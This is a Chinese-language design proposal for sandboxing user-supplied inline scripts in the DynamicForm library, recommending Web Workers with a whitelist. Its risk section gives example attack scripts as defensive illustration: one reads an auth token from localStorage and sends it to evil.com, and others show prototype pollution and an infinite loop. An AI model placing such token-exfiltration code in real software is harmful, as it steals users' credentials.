# Inline Script 安全隔离方案设计

> **状态：提案/未实现。** 本文完整保留 Worker、iframe、QuickJS、ShadowRealm 和白名单方案，供后续设计使用。当前实现仍在主线程通过动态 `Function` 执行，没有 `safeExecution`、Worker 或安全沙箱；文中的配置示例不可直接用于当前 `DynamicFormProps`。

## 1. 背景

### 1.1 当前实现

DynamicForm 的 Helpers 系统支持在以下场景执行用户提供的 inline script：

- **ui.transform**：字段值转换
- **ui.callbackProps**：Widget 回调函数
- **ui.validators**：自定义验证器
- **ui.linkages.fulfill/otherwise**：联动规则的效果函数

当前实现使用 `new Function()` 在浏览器主线程中直接执行脚本：

```typescript
export function executeInlineScript({
  code,
  params,
  helpers,
}: {
  code: string;
  params: Record<string, any>;
  helpers: Record<string, any>;
}) {
  const func = new Function(
    'params',
    'helpers',
    `return (${code})({ ...params, helpers })`
  );
  
  return func(params, helpers);
}
```

### 1.2 安全风险分析

当前实现**不提供安全隔离**，存在以下风险：

| 风险类型 | 描述 | 影响 |
|---------|------|------|
| **访问全局对象** | 可访问 `window`、`document`、`localStorage` 等 | 高：可能窃取用户数据、篡改页面 |
| **访问其他变量** | 可通过闭包访问外部作用域的变量 | 中：可能泄露敏感信息 |
| **无限循环** | 恶意或错误的代码可能导致页面卡死 | 高：影响用户体验 |
| **内存泄漏** | 创建大量对象而不释放 | 中：长时间使用后性能下降 |
| **原型污染** | 修改 `Object.prototype` 等全局原型 | 高：影响整个应用 |

**示例攻击代码**：

```typescript
// 访问 localStorage
{
  type: 'script',
  code: `function({ formData }) {
    const token = localStorage.getItem('auth_token');
    // 发送到恶意服务器
    fetch('https://evil.com/steal?token=' + token);
    return formData.value;
  }`
}

// 原型污染
{
  type: 'script',
  code: `function({ formData }) {
    Object.prototype.isAdmin = true;
    return formData.value;
  }`
}

// 无限循环
{
  type: 'script',
  code: `function({ formData }) {
    while(true) {}  // 页面卡死
  }`
}
```

### 1.3 设计边界说明

Helpers 系统的设计边界：

- ✅ **是**：依赖注入机制，提供工具函数和异步能力
- ❌ **不是**：安全沙箱环境，不隔离恶意代码

**当前文档的目标**：探讨如何在需要时提供真正的安全隔离能力。

## 2. 安全隔离方案对比

### 2.1 方案 1: Web Workers + Structured Clone

**原理**：在独立的 Worker 线程中执行脚本，完全隔离主线程环境

**架构**：

```
┌─────────────────────────────────────┐
│ Main Thread                          │
│ ┌─────────────────────────────────┐ │
│ │ ScriptExecutor                   │ │
│ │ - 序列化 params/helpers         │ │
│ │ - 管理 Worker 池                │ │
│ │ - 超时控制                       │ │
│ └─────────────────────────────────┘ │
│          ↓ postMessage               │
└─────────────────────────────────────┘
          ↓
┌─────────────────────────────────────┐
│ Web Worker Thread                    │
│ ┌─────────────────────────────────┐ │
│ │ - 重建 helpers                   │ │
│ │ - 执行 script                    │ │
│ │ - 返回结果                       │ │
│ └─────────────────────────────────┘ │
│          ↑ postMessage               │
└─────────────────────────────────────┘
```

**优点**：
- ✅ **真正的线程级隔离**：无法访问 DOM 和 window
- ✅ **浏览器原生支持**：无需额外依赖
- ✅ **超时控制**：可以终止执行超时的 Worker
- ✅ **性能损耗较小**：Worker 通信开销可接受
- ✅ **兼容性好**：所有现代浏览器都支持

**缺点**：
- ❌ **通信必须序列化**：不能传递函数、DOM 节点等
- ❌ **调试困难**：Worker 中的错误追踪相对复杂
- ❌ **Worker 创建开销**：需要 Worker 池优化

**实现复杂度**：★★★☆☆ (中等)

**安全等级**：★★★★★ (优秀)

### 2.2 方案 2: iframe sandbox + postMessage

**原理**：使用带 sandbox 属性的 iframe 执行脚本

**优点**：
- ✅ **可限制权限**：sandbox 属性可以禁用部分功能
- ✅ **实现相对简单**：使用 postMessage 通信
- ✅ **可传递复杂数据**：比 Worker 更灵活

**缺点**：
- ❌ **隔离不彻底**：仍可能访问部分 DOM API
- ❌ **性能开销**：创建 iframe 需要 DOM 操作
- ❌ **跨域复杂性**：需要处理跨域通信

**实现复杂度**：★★☆☆☆ (简单)

**安全等级**：★★★☆☆ (一般)

### 2.3 方案 3: QuickJS-WASM

**原理**：在浏览器中运行独立的 JavaScript 引擎（WASM）

**优点**：
- ✅ **完全隔离**：独立的 JS 运行时
- ✅ **精确控制**：可以完全控制可访问的 API
- ✅ **真正沙箱**：最彻底的隔离方案

**缺点**：
- ❌ **WASM 体积大**：~1-2MB，需要加载
- ❌ **性能开销大**：在 WASM 中运行 JS 有性能损失
- ❌ **实现复杂**：需要管理 WASM 实例
- ❌ **调试极困难**：双层嵌套的执行环境

**实现复杂度**：★★★★★ (很高)

**安全等级**：★★★★★ (完美)

### 2.4 方案 4: ShadowRealm (未来方案)

**原理**：使用 TC39 ShadowRealm 提案提供的原生沙箱

**优点**：
- ✅ **原生支持**：JavaScript 语言级别的沙箱
- ✅ **性能最优**：原生实现，无额外开销
- ✅ **API 简洁**：设计良好的标准 API

**缺点**：
- ❌ **浏览器支持不完善**：目前只有 Chrome 支持
- ❌ **还在提案阶段**：API 可能变化

**实现复杂度**：★☆☆☆☆ (很简单)

**安全等级**：★★★★★ (完美)

**当前状态**：不推荐在生产环境使用

## 3. 推荐方案：Web Workers + 白名单机制

### 3.1 整体架构

```
┌──────────────────────────────────────────────────────────┐
│ DynamicForm (Main Thread)                                 │
│                                                            │
│  ┌──────────────────────────────────────────────────┐   │
│  │ SafeScriptExecutor                                │   │
│  │                                                    │   │
│  │ - Worker 池管理 (预创建、复用、清理)            │   │
│  │ - 参数序列化 (helpers 函数 → 字符串)           │   │
│  │ - 超时控制 (5秒默认)                             │   │
│  │ - 结果缓存 (code + params hash)                  │   │
│  └──────────────────────────────────────────────────┘   │
│           │                                                │
│           │ postMessage({ code, params, helpers })        │
│           ↓                                                │
└──────────────────────────────────────────────────────────┘
           │
           ↓
┌──────────────────────────────────────────────────────────┐
│ Web Worker Thread (Isolated)                              │
│                                                            │
│  ┌──────────────────────────────────────────────────┐   │
│  │ SafeExecutionEnvironment                          │   │
│  │                                                    │   │
│  │ 1. 重建 helpers (字符串 → 函数)                 │   │
│  │ 2. 白名单检查 (只允许特定 API)                  │   │
│  │ 3. 执行脚本 (new Function)                       │   │
│  │ 4. 序列化结果                                     │   │
│  └──────────────────────────────────────────────────┘   │
│           │                                                │
│           │ postMessage(result)                           │
│           ↓                                                │
└──────────────────────────────────────────────────────────┘
```

### 3.2 安全特性

#### 3.2.1 完全隔离

| 攻击向量 | 防护措施 | 安全等级 |
|---------|---------|---------|
| 访问 DOM | Worker 线程无法访问 DOM | ✅ 完全防护 |
| 访问 window | Worker 中无 window 对象 | ✅ 完全防护 |
| 访问 localStorage | Worker 中无法访问 | ✅ 完全防护 |
| 访问其他脚本数据 | 每次执行独立作用域 | ✅ 完全防护 |
| 无限循环 | 超时终止 Worker | ✅ 完全防护 |
| 内存溢出 | Worker 终止后自动回收 | ✅ 完全防护 |
| 原型污染 | Worker 独立的全局对象 | ✅ 完全防护 |
| 恶意 API 调用 | 白名单机制 | ✅ 完全防护 |

#### 3.2.2 性能优化策略

1. **Worker 池管理**
   - 预创建 4 个 Worker
   - 空闲时复用，避免频繁创建
   - 超时后自动重建

2. **结果缓存**
   - 相同 code + params 直接返回缓存结果
   - LRU 策略，限制缓存大小

3. **增量传输**
   - 大数据分片传输
   - 使用 Transferable Objects (如 ArrayBuffer)

#### 3.2.3 开发体验

1. **透明集成**
   - 使用方式保持不变
   - 自动在 Worker 中执行

2. **错误提示**
   - Worker 中的错误会带上完整堆栈
   - 超时错误明确提示
   - 提供调试模式（禁用 Worker，方便调试）

### 3.3 兼容性考虑

**浏览器支持**：
- ✅ Chrome 4+
- ✅ Firefox 3.5+
- ✅ Safari 4+
- ✅ Edge 12+

**降级策略**：在不支持 Worker 的环境中自动降级为主线程执行

## 4. 实施建议

### 4.1 分阶段实施

#### Phase 1: 基础 Worker 执行器 (2 周)

**目标**：实现基本的 Worker 隔离执行

**任务**：
1. 实现 `SafeScriptExecutor` 类
2. 实现 Worker 脚本 (`safe-worker.ts`)
3. 实现 helpers 序列化/反序列化
4. 实现超时控制
5. 编写单元测试

**交付物**：
- 可工作的 Worker 执行器
- 基础测试用例

#### Phase 2: Worker 池和缓存 (1 周)

**目标**：优化性能

**任务**：
1. 实现 Worker 池管理
2. 实现结果缓存（LRU）
3. 性能测试和优化
4. 压力测试

**交付物**：
- Worker 池管理器
- 缓存机制
- 性能测试报告

#### Phase 3: 集成和测试 (1 周)

**目标**：集成到 DynamicForm

**任务**：
1. 集成到现有的 `executeInlineScript`
2. 添加开发模式支持（可选禁用 Worker）
3. 完善错误处理和日志
4. 编写集成测试
5. 更新文档

**交付物**：
- 完整集成的安全执行器
- 开发者文档
- 使用示例

#### Phase 4: 生产验证 (1 周)

**目标**：生产环境验证

**任务**：
1. 灰度发布
2. 监控性能指标
3. 收集用户反馈
4. 修复发现的问题

**交付物**：
- 稳定的生产版本
- 监控报告

### 4.2 配置选项设计

```typescript
interface SafeExecutionConfig {
  // 是否启用 Worker 隔离
  useWorker?: boolean;
  
  // Worker 池大小
  maxWorkers?: number;
  
  // 超时时间（毫秒）
  timeout?: number;
  
  // 是否启用缓存
  enableCache?: boolean;
  
  // 缓存最大条目数
  maxCacheSize?: number;
  
  // 白名单全局对象
  allowedGlobals?: string[];
}

// DynamicForm Props
interface DynamicFormProps {
  // ... 现有 props
  
  /**
   * 安全执行配置
   */
  safeExecution?: SafeExecutionConfig;
}
```

**使用示例**：

```typescript
// 开发环境：禁用 Worker，方便调试
<DynamicForm
  schema={schema}
  safeExecution={{
    useWorker: false  // 主线程执行，可以打断点
  }}
/>

// 生产环境：启用完整隔离
<DynamicForm
  schema={schema}
  safeExecution={{
    useWorker: true,
    maxWorkers: 4,
    timeout: 5000,
    enableCache: true
  }}
/>
```

### 4.3 风险和应对

**风险 1：Worker 通信性能开销**
- **影响**：频繁执行小脚本时性能下降
- **应对**：Worker 池复用、结果缓存、批量执行优化

**风险 2：helpers 序列化限制**
- **影响**：某些复杂对象无法序列化
- **应对**：提供序列化指南、支持自定义序列化器、开发模式降级

**风险 3：调试困难**
- **影响**：开发体验下降
- **应对**：提供开发模式（禁用 Worker）、完善错误信息、提供调试工具

**风险 4：浏览器兼容性**
- **影响**：旧浏览器无法使用
- **应对**：自动降级为主线程执行、明确浏览器支持列表

## 5. 总结

### 5.1 核心价值

Web Workers + 白名单机制方案提供：

1. **真正的安全隔离**：Worker 线程级别的隔离
2. **良好的性能**：通过池化和缓存优化
3. **优秀的兼容性**：所有现代浏览器都支持
4. **灵活的配置**：可以根据需求启用/禁用
5. **良好的开发体验**：支持开发模式调试

### 5.2 适用场景

**推荐使用安全隔离的场景**：

- ✅ 执行第三方提供的脚本
- ✅ 多租户系统中的用户自定义脚本
- ✅ 公开的表单构建器平台
- ✅ 需要符合安全合规要求的系统

**可以不使用隔离的场景**：

- ✅ 内部系统，脚本由开发团队编写
- ✅ 脚本来源可信（如从受保护的配置服务器加载）
- ✅ 性能要求极高，无法接受 Worker 开销

### 5.3 下一步行动

1. **评估需求**：确定项目是否需要安全隔离
2. **选择方案**：根据需求选择合适的隔离方案
3. **制定计划**：按照分阶段实施计划执行
4. **持续优化**：收集反馈，持续改进

---

**文档版本**：v1.0  
**最后更新**：2026-08-07  
**维护者**：DynamicForm 团队
